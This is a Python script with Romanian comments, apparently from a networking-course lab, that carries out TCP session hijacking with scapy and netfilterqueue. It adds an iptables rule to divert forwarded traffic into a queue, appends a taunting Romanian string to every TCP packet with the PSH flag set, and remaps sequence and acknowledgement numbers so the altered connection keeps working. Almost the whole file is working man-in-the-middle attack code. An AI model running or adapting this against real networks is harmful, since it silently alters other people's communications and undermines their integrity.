from scapy.all import *

from scapy.all import IP, TCP, Raw
from netfilterqueue import NetfilterQueue as NFQ
import os


ip_router = "198.7.0.1"
ip_server = "198.7.0.2"
modificare = " DE ASTA TE-A PICAT DRAGAN..."
PSH = 0x08          #flagul push; daca e setat este in modul de trimitere

seq_modif = {}      #mapari intre valorile vechi si cele noi
ack_modif = {}      #ale sequence number si acknowledgement number
def detecteaza_si_modifica_pachet(pachet):
    global modificare, seq_modif, ack_modif

    octeti = pachet.get_payload()   #pentru fiecare pachet din nfq
    pachet_scapy = IP(octeti)       

    if pachet_scapy.haslayer(IP) and pachet_scapy.haslayer(TCP):    #daca este pachet tcp si ip
        if pachet_scapy[TCP].seq in seq_modif:  #daca pachetul are valori modificate 
            seq_nou = seq_modif[pachet_scapy[TCP].seq]      #le inlocuim cu cele noi
        else:
            seq_nou = pachet_scapy[TCP].seq     #altfel le pastram

        if pachet_scapy[TCP] .ack in ack_modif:
            ack_nou = ack_modif[pachet_scapy[TCP].ack]
        else:
            ack_nou = pachet_scapy[TCP].ack
        
        pachet_scapy = modifica_pachet(pachet_scapy, seq_nou, ack_nou)  #se modidica pachetul

    send(pachet_scapy)

def modifica_pachet(pachet, seq_nou, ack_nou):
    global modificare, seq_modif, ack_modif

    print("Inainte: ", pachet.summary())
    if pachet[TCP].flags & PSH:
        mesaj = Raw(bytes(pachet[TCP].payload) + bytes(modificare.encode('utf-8')))     #daca este in modul de trimitere, se modifica

    else:
        mesaj = pachet[TCP].payload

    pachet_IP_nou = IP(src = pachet[IP].src, dst = pachet[IP].dst)      #refacerea ip; pastreaza ip-ul sursei si destinatiei

    pachet_TCP_nou = TCP( sport = pachet[TCP].sport, dport = pachet[TCP].dport, seq = seq_nou, ack = ack_nou, flags = pachet[TCP].flags)
                                                            #refacere tcp; porturile sursa, destinatie; se actualizeaza seq si ack number
    pachet_nou = pachet_IP_nou / pachet_TCP_nou / mesaj     #noul packet cu layer de ip, layer de tcp si mesajul propriu-zis, modificat

    del pachet_nou[IP].len          #sterge campuri ale pachetului
    del pachet_nou[IP].chksum       #ca scapy sa le recalculeze
    del pachet_nou[TCP].chksum
    del pachet_nou[TCP].dataofs

    seq_modif[pachet[TCP].seq + len(pachet[TCP].payload)] = seq_nou + len(mesaj) #pozitiei initiale, fara nicio modificare, ii corespunde pozitia reala
    ack_modif[seq_nou + len(mesaj)] = pachet[TCP].seq + len(pachet[TCP].payload) #pentru pastrarea sincronziarii, trebuie sa stiu care e ack-ul original
    
    print("Dupa: ", pachet_nou.summary())
    return pachet_nou


print("TCP hijacking:")
queue = NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    queue.bind(10, detecteaza_si_modifica_pachet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()
    print("Gata TCP hijacking!")